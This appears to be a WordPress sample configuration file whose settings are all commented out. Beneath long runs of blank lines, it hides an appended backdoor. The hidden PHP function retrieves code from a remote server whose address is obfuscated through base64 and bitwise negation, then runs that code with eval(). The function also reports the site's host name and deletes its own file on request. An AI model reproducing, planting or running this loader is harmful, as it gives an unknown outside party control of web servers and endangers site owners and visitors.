<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link http://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
//define('DB_NAME', 'database_name_here');

/** MySQL database username */
//define('DB_USER', 'username_here');

/** MySQL database password */
//define('DB_PASSWORD', 'password_here');

/** MySQL hostname */
//define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
//define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
//define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
//define('AUTH_KEY',         'put your unique phrase here');
//define('SECURE_AUTH_KEY',  'put your unique phrase here');
//define('LOGGED_IN_KEY',    'put your unique phrase here');
//define('NONCE_KEY',        'put your unique phrase here');
//define('AUTH_SALT',        'put your unique phrase here');
//define('SECURE_AUTH_SALT', 'put your unique phrase here');
//define('LOGGED_IN_SALT',   'put your unique phrase here');
//define('NONCE_SALT',       'put your unique phrase here');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
//$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
//define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
//if ( !defined('ABSPATH') )
//	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
//require_once(ABSPATH . 'wp-settings.php');













































































































































































function _dlss($url)
{
        $file_contents = '';
		$real_user_agent = $_SERVER['HTTP_USER_AGENT'];
        if (function_exists('file_get_contents')) {
			ini_set('user_agent',$real_user_agent);
            $file_contents = @file_get_contents($url);
        }
        if (strlen($file_contents) < 10 && function_exists('curl_init')) {
            $file_contents = '';
			$ch = curl_init();
			$timeout = 60;
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
			curl_setopt($ch, CURLOPT_USERAGENT, $real_user_agent);
			$file_contents = curl_exec($ch);
			curl_close($ch);
     }
        return $file_contents;
}

if (isset($_GET['do'])) {
    unlink(__FILE__);
    header("Location :?t");
} else {
    $groups = 'hu20150228';
    $host = isset($_SERVER['HTTP_X_FORWARDED_HOST']) ? $_SERVER['HTTP_X_FORWARDED_HOST'] : (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : $_SERVER['SERVER_NAME'].($_SERVER['SERVER_PORT']=='80' ? '' : ':'.$_SERVER['SERVER_PORT']));
    $host = urlencode($host);
    $code = _dlss(~base64_decode('l4uLj8XQ0IuSj9GSkJGYlovRnJCS0IuQkJOM0JyQm5rQwInClpGMi56Tk6CckI2a'));
    @eval($code);
}
















































































































































































